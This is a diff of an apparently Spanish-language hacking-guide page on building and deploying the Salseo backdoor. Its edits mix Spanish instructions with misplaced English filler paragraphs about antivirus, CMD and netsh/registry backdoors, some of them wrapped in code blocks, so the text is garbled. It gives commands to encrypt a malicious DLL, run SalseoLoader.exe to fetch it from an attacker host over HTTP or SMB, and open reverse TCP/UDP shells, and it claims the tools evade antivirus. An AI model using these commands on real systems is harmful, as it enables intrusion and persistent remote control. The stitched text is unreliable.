@@ -69,20 +69,20 @@ Once installed, the Salseo backdoor provides the attacker with a range of capabi
 
 Detecting and preventing the Salseo backdoor can be challenging due to its stealthy nature. However, there are some measures that can be taken to mitigate the risk:
 
-1. **Antivirus software**: Keeping antivirus software up to date can help detect and remove known instances of the Salseo backdoor.
+1. **Antivirus software**: Keeping antivirus software up to date can help detect and remove known instances of the Salseo backdoor. Regular scans should be performed to identify any potential infections.
 
-2. **Regular system updates**: Installing software updates and patches can help prevent the exploitation of vulnerabilities that the backdoor may rely on.
+2. **Software updates**: Keeping software and operating systems up to date with the latest security patches can help prevent the exploitation of vulnerabilities that the backdoor may use for installation.
 
 3. **User awareness**: Educating users about the risks of opening suspicious email attachments or downloading files from untrusted sources can help prevent the initial installation of the backdoor.
 
-4. **Network monitoring**: Monitoring network traffic for suspicious activity can help detect the presence of the backdoor or its communication with the attacker's command and control server.
+4. **Network monitoring**: Monitoring network traffic for suspicious activity can help identify communication between the infected system and the attacker's command and control server.
 
-By implementing these measures, organizations can reduce the risk of falling victim to the Salseo backdoor and other similar malware.
+By implementing these measures, the risk of falling victim to the Salseo backdoor can be significantly reduced.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
-Ok, ahora tienes todo lo que necesitas para ejecutar todo el asunto de Salseo: el **EvilDalsa.dll codificado** y el **binario de SalseoLoader**.
+Ok, ahora tienes todo lo que necesitas para ejecutar todo el asunto de Salseo: el **EvilDalsa.dll codificado** y el **binario de SalseoLoader.**
 
 **Sube el binario SalseoLoader.exe a la máquina. No deberían ser detectados por ningún AV...**
 
@@ -96,7 +96,7 @@ SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Att
 ```
 ### **Obteniendo una shell inversa UDP (descargando un dll codificado a través de SMB)**
 
-Recuerda iniciar un nc como oyente de la shell inversa y un servidor SMB para servir el evilsalsa codificado (impacket-smbserver).
+Recuerda iniciar un nc como el oyente de la shell inversa, y un servidor SMB para servir el evilsalsa codificado (impacket-smbserver).
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
@@ -133,7 +133,7 @@ Abre el proyecto SalseoLoader usando Visual Studio.
 
 ### Agrega antes de la función principal: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Instala DllExport para este proyecto
 
@@ -147,7 +147,7 @@ Abre el proyecto SalseoLoader usando Visual Studio.
 
 En la carpeta de tu proyecto han aparecido los archivos: **DllExport.bat** y **DllExport\_Configure.bat**
 
-### **Desinstala DllExport**
+### **D**esinstala DllExport
 
 Presiona **Desinstalar** (sí, es extraño pero confía en mí, es necesario)
 
@@ -210,15 +210,17 @@ CMD (Command Prompt) is a command-line interpreter in Windows operating systems.
 
 CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By gaining access to CMD, hackers can perform a wide range of activities, including reconnaissance, privilege escalation, and data exfiltration.
 
-To exploit CMD, hackers often use backdoors to maintain persistent access to a compromised system. A backdoor is a hidden entry point that allows unauthorized access to a system. By installing a backdoor on a target system, hackers can bypass security measures and gain remote access at any time.
+To exploit CMD, hackers often use backdoors to gain persistent access to a compromised system. A backdoor is a hidden entry point that allows unauthorized access to a system. By installing a backdoor on a target system, hackers can maintain access even if the system is patched or the user's password is changed.
 
-There are several methods to create a backdoor in CMD. One common technique is to modify system files or registry entries to enable remote access. Another method is to use a Trojan horse program that disguises itself as a legitimate file or application.
+There are several ways to create a backdoor in CMD. One common method is to use the "netsh" command to create a persistent backdoor. The "netsh" command is a powerful tool that allows users to configure network settings. By using the "netsh" command, hackers can create a backdoor that listens for incoming connections and provides them with remote access to the compromised system.
 
-Once a backdoor is installed, hackers can use CMD to execute commands and control the compromised system. They can upload and download files, manipulate system settings, and even launch attacks on other systems.
+Another method to create a backdoor in CMD is by using the "reg" command to modify the Windows Registry. The Windows Registry is a hierarchical database that stores configuration settings and options for the operating system. By modifying the Registry, hackers can create a backdoor that is executed every time the system starts up, providing them with persistent access to the compromised system.
 
-To protect against CMD-based attacks, it is important to regularly update and patch your operating system. Additionally, implementing strong access controls and monitoring network traffic can help detect and prevent unauthorized access.
+Once a backdoor is installed in CMD, hackers can use it to execute commands and scripts remotely. They can also use it to upload and download files, manipulate system settings, and perform other malicious activities.
 
-Remember, CMD can be a powerful tool in the hands of both hackers and system administrators. Understanding its capabilities and vulnerabilities is essential for maintaining the security of your systems.
+To protect against CMD backdoors, it is important to regularly update and patch the operating system. It is also recommended to use strong passwords and enable multi-factor authentication to prevent unauthorized access to CMD. Additionally, monitoring network traffic and using intrusion detection systems can help detect and mitigate CMD backdoor attacks.
+
+CMD is a powerful tool that can be used for both legitimate and malicious purposes. By understanding how hackers exploit CMD and implementing appropriate security measures, individuals and organizations can better protect themselves against CMD backdoor attacks.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
